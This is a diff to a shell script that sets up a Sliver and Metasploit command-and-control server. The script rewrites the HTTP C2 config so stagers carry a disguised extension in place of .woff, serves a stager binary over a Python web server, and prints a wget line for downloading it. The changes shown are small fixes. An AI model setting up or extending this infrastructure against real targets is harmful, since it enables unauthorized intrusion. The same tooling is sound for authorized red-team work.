@@ -8,6 +8,7 @@ ip=$(curl ifconfig.me)
 apt update -y
 apt install metasploit-framework -y
 
+echo ""
 echo "=== Downloading Sliver Binary from github.com ==="
 echo ""
 # download sliver
@@ -27,7 +28,7 @@ echo ""
 #unpack sliver to generate config files
 echo "=== Unpack Sliver Binary .. Generating Server Config and Malleable C2 Config ==="
 echo ""
-/opt/sliver/sliver-server-linux unpack
+/opt/sliver/sliver-server-linux unpack --force
 echo ""
 
 sed 's/.woff/'$stager_extension/'' /root/.sliver/configs/http-c2.json >> /root/.sliver/configs/http-c2_markdown_stager.json
@@ -43,4 +44,4 @@ chown kali:kali /tmp/www/sliver_stager.bin
 python3 -m http.server -d /tmp/www &
 
 echo "=== Access Your MSF Stager here ==="
-echo "wget http://"$ip"/sliver_stager.bin"
+echo "wget http://"$ip":8000/sliver_stager.bin"
